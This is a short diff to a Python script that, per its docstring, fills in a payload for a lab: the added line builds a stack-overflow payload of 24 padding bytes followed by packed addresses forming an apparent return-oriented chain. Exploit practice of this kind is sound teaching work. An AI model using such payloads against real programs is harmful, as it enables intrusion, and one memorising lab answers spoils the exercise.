@@ -5,6 +5,6 @@ TODO: replace the empty payload with the bytes required by the lab.
 """
 import sys
 
-payload = b""
+payload = b'A' * 24 + b'\x34\x1a\x40\x00\x00\x00\x00\x00' + b'\x33\x1a\x40\x00\x00\x00\x00\x00' + b'\x04\x00\x00\x00\x00\x00\x00\x00' + b'\x78\x19\x40\x00\x00\x00\x00\x00'
 
 sys.stdout.buffer.write(payload)
